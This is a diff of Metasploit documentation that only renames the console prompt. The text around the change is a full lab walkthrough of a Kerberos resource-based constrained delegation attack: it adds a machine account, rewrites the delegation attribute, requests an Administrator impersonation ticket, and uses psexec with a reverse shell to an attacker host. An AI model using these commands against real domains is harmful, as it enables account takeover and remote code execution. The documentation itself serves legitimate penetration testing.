@@ -121,7 +121,7 @@ with the Service for User (S4U) Kerberos extension.
 First create the computer account:
 
 ```msf
-msf6 auxiliary(admin/dcerpc/samr_account) > show options
+msf auxiliary(admin/dcerpc/samr_account) > show options
 
    Name              Current Setting  Required  Description
    ----              ---------------  --------  -----------
@@ -154,13 +154,13 @@ Auxiliary action:
    ADD_COMPUTER  Add a computer account
 
 
-msf6 auxiliary(admin/dcerpc/samr_account) > set RHOSTS 192.168.159.10
+msf auxiliary(admin/dcerpc/samr_account) > set RHOSTS 192.168.159.10
 RHOSTS => 192.168.159.10
-msf6 auxiliary(admin/dcerpc/samr_account) > set SMBUser sandy
+msf auxiliary(admin/dcerpc/samr_account) > set SMBUser sandy
 SMBUser => sandy
-msf6 auxiliary(admin/dcerpc/samr_account) > set SMBPass Password1!
+msf auxiliary(admin/dcerpc/samr_account) > set SMBPass Password1!
 SMBPass => Password1!
-msf6 auxiliary(admin/dcerpc/samr_account) > run
+msf auxiliary(admin/dcerpc/samr_account) > run
 [*] Running module against 192.168.159.10
 
 [*] 192.168.159.10:445 - Using automatically identified domain: MSFLAB
@@ -168,21 +168,21 @@ msf6 auxiliary(admin/dcerpc/samr_account) > run
 [+] 192.168.159.10:445 -   Password: A2HPEkkQzdxQirylqIj7BxqwB7kuUMrT
 [+] 192.168.159.10:445 -   SID:      S-1-5-21-3402587289-1488798532-3618296993-1655
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/dcerpc/samr_account) > use auxiliary/admin/ldap/rbcd
+msf auxiliary(admin/dcerpc/samr_account) > use auxiliary/admin/ldap/rbcd
 ```
 
 Now use the RBCD module to read the current value of `msDS-AllowedToActOnBehalfOfOtherIdentity`:
 
 ```msf
-msf6 auxiliary(admin/ldap/rbcd) > set USERNAME sandy@msflab.local
+msf auxiliary(admin/ldap/rbcd) > set USERNAME sandy@msflab.local
 BIND_DN => sandy@msflab.local
-msf6 auxiliary(admin/ldap/rbcd) > set PASSWORD Password1!
+msf auxiliary(admin/ldap/rbcd) > set PASSWORD Password1!
 BIND_PW => Password1!
-msf6 auxiliary(admin/ldap/rbcd) > set RHOSTS 192.168.159.10
+msf auxiliary(admin/ldap/rbcd) > set RHOSTS 192.168.159.10
 RHOSTS => 192.168.159.10
-msf6 auxiliary(admin/ldap/rbcd) > set DELEGATE_TO WS01$
+msf auxiliary(admin/ldap/rbcd) > set DELEGATE_TO WS01$
 DELEGATE_TO => WS01$
-msf6 auxiliary(admin/ldap/rbcd) > read
+msf auxiliary(admin/ldap/rbcd) > read
 [*] Running module against 192.168.159.10
 
 [+] Successfully bound to the LDAP server!
@@ -195,9 +195,9 @@ msf6 auxiliary(admin/ldap/rbcd) > read
 Writing a new `msDS-AllowedToActOnBehalfOfOtherIdentity` value using the computer account created by `admin/dcerpc/samr_account`:
 
 ```msf
-msf6 auxiliary(admin/ldap/rbcd) > set DELEGATE_FROM DESKTOP-QLSTR9NW$
+msf auxiliary(admin/ldap/rbcd) > set DELEGATE_FROM DESKTOP-QLSTR9NW$
 DELEGATE_FROM => DESKTOP-QLSTR9NW$
-msf6 auxiliary(admin/ldap/rbcd) > write
+msf auxiliary(admin/ldap/rbcd) > write
 [*] Running module against 192.168.159.10
 
 [+] Successfully bound to the LDAP server!
@@ -210,7 +210,7 @@ msf6 auxiliary(admin/ldap/rbcd) > write
 Reading the value of `msDS-AllowedToActOnBehalfOfOtherIdentity` to verify the value is updated:
 
 ```msf
-msf6 auxiliary(admin/ldap/rbcd) > read
+msf auxiliary(admin/ldap/rbcd) > read
 [*] Running module against 192.168.159.10
 
 [+] Successfully bound to the LDAP server!
@@ -219,14 +219,14 @@ msf6 auxiliary(admin/ldap/rbcd) > read
 [*] Allowed accounts:
 [*]   DESKTOP-QLSTR9NW$ (S-1-5-21-3402587289-1488798532-3618296993-1655)
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/ldap/rbcd) >
+msf auxiliary(admin/ldap/rbcd) >
 ```
 
 Next we can use the `auxiliary/admin/kerberos/get_ticket` module to request a new S4U impersonation ticket for the Administrator
 account using the previously created machine account. For instance requesting a service ticket for SMB access:
 
 ```msf
-msf6 auxiliary(admin/kerberos/get_ticket) > run action=GET_TGS rhost=192.168.159.10 username=DESKTOP-QLSTR9NW password=A2HPEkkQzdxQirylqIj7BxqwB7kuUMrT domain=msflab.local spn=cifs/ws01.msflab.local impersonate=Administrator
+msf auxiliary(admin/kerberos/get_ticket) > run action=GET_TGS rhost=192.168.159.10 username=DESKTOP-QLSTR9NW password=A2HPEkkQzdxQirylqIj7BxqwB7kuUMrT domain=msflab.local spn=cifs/ws01.msflab.local impersonate=Administrator
 [*] Running module against 192.168.159.10
 
 [+] 192.168.159.10:88 - Received a valid TGT-Response
@@ -242,7 +242,7 @@ msf6 auxiliary(admin/kerberos/get_ticket) > run action=GET_TGS rhost=192.168.159
 The saved TGS can be used in a pass-the-ticket style attack. For instance using the `exploit/windows/smb/psexec` module for a reverse shell:
 
 ```msf
-msf6 exploit(windows/smb/psexec) > run lhost=192.168.123.1 rhost=192.168.159.10 username=Administrator smb::auth=kerberos smb::rhostname=ws01.msflab.local domaincontrollerrhost=192.168.159.10 smbdomain=msflab.local smb::krb5ccname=/Users/user/.msf4/loot/20230222095449_default_192.168.159.10_mit.kerberos.cca_614556.bin
+msf exploit(windows/smb/psexec) > run lhost=192.168.123.1 rhost=192.168.159.10 username=Administrator smb::auth=kerberos smb::rhostname=ws01.msflab.local domaincontrollerrhost=192.168.159.10 smbdomain=msflab.local smb::krb5ccname=/Users/user/.msf4/loot/20230222095449_default_192.168.159.10_mit.kerberos.cca_614556.bin
 
 [*] Started reverse TCP handler on 192.168.123.1:4444
 [*] 192.168.159.10:445 - Connecting to the server...
